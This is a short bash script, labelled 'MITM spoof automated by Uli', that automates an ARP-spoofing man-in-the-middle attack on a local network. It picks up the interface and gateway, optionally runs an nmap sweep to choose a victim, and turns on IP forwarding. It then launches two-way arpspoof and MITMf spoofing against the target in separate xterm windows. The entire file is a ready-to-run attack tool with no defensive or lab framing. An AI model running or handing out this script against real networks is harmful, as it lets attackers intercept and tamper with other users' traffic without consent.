#!/bin/bash

# version 0.1
# 26.10.2017

declare INTERFACE
declare GATEWAY
declare TARGET
declare LASTTARGET
declare SUBNET
declare MYIP
declare ARP_COMMANDA
declare ARP_COMMANDB
declare MITMF_COMMAND
declare WHATNEXT

#default target
TARGET="192.168.1.100"

#get other variables
INTERFACE="$(iwconfig | head -1 | cut -d " " -f1)"
MYIP="$(ifconfig $INTERFACE | grep inet | head -1 | awk '{print $2}')"
GATEWAY="$(ip route | head -1 | awk {'print $3'})"

SUBNET="$(echo $GATEWAY | head -1 | cut -d "." -f1)"".""$(echo $GATEWAY | head -1 | cut -d "." -f2)"".""$(echo $GATEWAY | head -1 | cut -d "." -f3)""."

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
transparent="\e[0m"

#Functions
cleanp(){
  printf "$red""Killing processes: ""$transparent""$1 $2 $3 \n"
  kill -SIGINT $1
  kill -SIGINT $2
  kill $3 && sleep 3
}

kill_cleanp(){
  printf "$red""Killing processes: ""$transparent""$1 $2 \n"
  kill -SIGINT $1
  kill -SIGINT $2 && sleep 0.5
  exit
}

clear
echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
echo -e "$red[              MITM spoof automated by Uli             ]" 
echo -e "$red[                       ver. 0.1                       ]"
echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
echo
sleep 0.8

printf $green"Reading ... $transparent \n"
sleep 0.3
printf $grey"This IP: $white""$MYIP"" \n"
sleep 0.5
printf $grey"Gateway IP: $white""$GATEWAY"" \n"
sleep 0.5
printf $grey"Interface: $white""$INTERFACE""$transparent \n\n"
sleep 0.8

printf $green"What next? \n"
printf $red"["$yellow"1"$red"] "$yellow"enter new target\n"
printf $red"["$yellow"2"$red"] "$yellow"run nmap and enter new target\n"
printf $red"["$yellow"*"$red"] "$yellow"use default target$transparent $TARGET\nChoice:"
read -p "" WHATNEXT

case $WHATNEXT in
1) printf " \n";printf $green"Enter new target $SUBNET"$transparent; read -p "" LASTTARGET; TARGET=$SUBNET""$LASTTARGET ;;
2) printf $transparent; nmap -sn ${GATEWAY}/24 ;printf "\n""$green""Enter new target $SUBNET"$transparent; read -p "" LASTTARGET; TARGET=$SUBNET""$LASTTARGET ;;
*) printf $transparent ;;
esac

printf "\n""$green""Target: $transparent $TARGET \n\n"

printf $green"Enable forwarding ... $transparent \n"
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 0.5

ARP_COMMANDA="arpspoof -i ""$INTERFACE"" -t ""$GATEWAY"" ""$TARGET"
ARP_COMMANDB="arpspoof -i ""$INTERFACE"" -t ""$TARGET"" ""$GATEWAY"
MITMF_COMMAND="mitmf --arp --spoof --gateway ""$GATEWAY"" --targets ""$TARGET"" -i ""$INTERFACE"

printf $yellow"Arpspoof gateway-target ... $transparent \n"
xterm -title "arpspoof gateway-target" -geometry 105x10+10+10 -e $ARP_COMMANDA &
printf $yellow"Arpspoof target-gateway ... $transparent \n"
xterm -title "arpspoof target-gateway" -geometry 105x10+700+10 -e $ARP_COMMANDB &
sleep 1
list=$(pidof arpspoof)

printf $yellow"Starting MITMf ... $transparent \n\n"
xterm -title "mitmf" -geometry 220x35+10+200 -e $MITMF_COMMAND &
sleep 1
pidofmitmf=$(pidof -x mitmf)

killprocesses="${list[0]}"" ""${list[1]}"" ""$pidofmitmf"
trap 'kill_cleanp $killprocesses' SIGINT;

printf $blue"Press any key to quit ... $transparent \n"
read -n1 -r -s -p "" key

cleanp $killprocesses
printf "\n"
